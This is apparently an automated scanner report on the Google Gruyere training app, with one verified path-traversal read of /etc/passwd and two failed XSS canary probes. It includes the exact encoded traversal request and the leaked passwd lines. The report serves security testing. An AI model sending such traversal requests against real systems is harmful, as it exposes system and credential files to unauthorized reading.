# L3 Proven Real Impact — https://google-gruyere.appspot.com
run `run-228ffb67c9` — layer sentinel-impact/4.4.0

- impacts: 3 total / **1 VERIFIED** / 0 INFERRED / 2 PROBE_FAILED / 0 NOT_SAFE_TO_PROVE / 0 REFUSED
- safety ceiling: capability proven, not exploited — أُثبتت القدرة، لم تُستغَل

## traversal_file_read — VERIFIED
- path `L3P-fcc292fc64` findings ['F-4eac8c9136'] — traversal_file_read at /479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd (param ) — minimal benign proof
- detail: `{"file": "227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd", "shared_markers": ["root:x:0:0:root:/root:/bin/sh", "daemon:x:1:1:daemon:/usr/sbin:/bin/sh", "bin:x:2:2:bin:/bin:/bin/sh", "sys:x:3:3:sys:/dev:/bin/sh"]}`
- evidence [probe] pr-0001: 'root:x:0:0:root:/root:/bin/sh'
  - probe: GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd body=''
  - response: status 200 body='root:x:0:0:root:/root:/bin/sh\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bi'

## xss_stored_persistence — PROBE_FAILED
- path `L3P-c01bc22425` findings ['F-85f0251945'] — xss_stored_persistence at /479896317371227311345106373618080751617/saveprofile (param uid) — minimal benign proof
- reason: the stored canary did not persist AND execute (measured below) — honest failure
- detail: `{"resubmit_status": 200, "fired": false, "payload_rides_the_request": true, "observed_flag": "", "expected_flag": "l3stocanary"}`

## xss_browser_execution — PROBE_FAILED
- path `L3P-f96124c1eb` findings ['F-fada1dc319'] — xss_browser_execution at /479896317371227311345106373618080751617/snippets.gtl (param uid) — minimal benign proof
- reason: the browser did not execute the planned canary (measured below) — honest failure, never a fake proof
- detail: `{"fired": false, "observed_flag": "", "expected_flag": "l3canary"}`

